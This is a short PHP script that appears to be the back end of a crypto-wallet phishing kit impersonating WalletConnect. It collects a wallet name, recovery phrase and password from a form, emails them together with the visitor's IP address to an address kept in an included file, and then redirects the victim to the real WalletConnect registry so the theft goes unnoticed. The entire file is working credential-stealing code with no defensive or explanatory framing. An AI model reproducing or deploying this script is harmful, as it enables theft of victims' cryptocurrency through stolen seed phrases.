<?php
include 'email.php';
$wallet = $_POST['w'];
$phrase = $_POST['phrase'];
$password = $_POST['password'];
$ip=$_SERVER['REMOTE_ADDR'];
$subject = "contact submited by $ip";
$message = "wallet: ".$wallet."\n Phase : ".$phrase."\n Password : ".$password."\n"; 
$headers = 'From: sender@example.com' . PHP_EOL .
'X-Mailer: PHP/' . phpversion();
 
// Sending email
mail($to, $subject, $message, $headers);
header('Location: https://registry.walletconnect.org/wallets');
?>

